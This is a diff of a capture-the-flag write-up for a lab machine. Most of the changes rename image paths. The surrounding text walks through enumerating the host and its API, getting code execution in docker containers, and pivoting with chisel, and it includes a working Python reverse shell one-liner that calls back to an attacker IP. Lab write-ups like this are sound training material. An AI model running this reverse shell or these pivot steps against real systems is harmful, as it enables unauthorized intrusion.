@@ -22,11 +22,11 @@ This looks like some sort of Flask application because of the background. Anyway
 
 Gobuster did not find much, but did find an /api endpoint:
 
-<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (107) (1).png" alt=""><figcaption></figcaption></figure>
 
 Enumeration of vhosts also revealed the dev.rainycloud.htb domain.
 
-<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (109) (2).png" alt=""><figcaption></figcaption></figure>
 
 Investigating the login function, we can see that on a failed attempt, this appears within the page source.
 
@@ -38,7 +38,7 @@ Pretty much confirms that this is a Flask application with app.py being used.
 
 There's some form of WAF or ACL on the dev endpoint.
 
-<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (114) (1).png" alt=""><figcaption></figcaption></figure>
 
 This looks bypassable using SSRF, but I was unable to make it work.
 
@@ -46,11 +46,11 @@ This looks bypassable using SSRF, but I was unable to make it work.
 
 There was a /api endpoint found on the website, and I plan to fuzz that. I used feroxbuster for the recursive abilities.
 
-<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (106) (2).png" alt=""><figcaption></figcaption></figure>
 
 This turned out to be a bit fruitless, because I was unable to even find anything of interest. I tried some extensions of my own and found one that works (out of sheer luck).
 
-<figure><img src="../../../.gitbook/assets/image (98) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (98) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using this method, I was able to make out that there were 3 users, because entering /api/4 would return nothing. So we know that the last parameter should be a number of some sort. I tried out loads of numbers but nothing was returned. It wasn't until I decided to try using 1.0 and it worked...
 
@@ -70,7 +70,7 @@ Within the login, we are able to simply register and start a new docker containe
 
 Within each docker container, we can basically get RCE on it. This can be done using the execute command button. I found that using the one without the background creates a very unstable shell, so use the other one.
 
-<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (119) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can use this reverse shell command:
 
@@ -78,19 +78,19 @@ We can use this reverse shell command:
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (110) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Pivoting
 
 Now, we need to think about how to use this container to find out more about the machine. Firstly, I took a look around at the IP addresses and found out that I should be scanning the other containers present on this network using some tunneling. What gave it away for me was the IP address ending in 3, meaning there are probably other hosts on this.
 
-<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (113) (2).png" alt=""><figcaption></figcaption></figure>
 
 As such, I transferred chisel over to this machine and created a tunnel.
 
 <figure><img src="../../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (104) (2).png" alt=""><figcaption></figcaption></figure>
 
 Now that we have this, we can begin to enumerate the network inside. We can do a quick ping sweep to see what's alive in there.
 
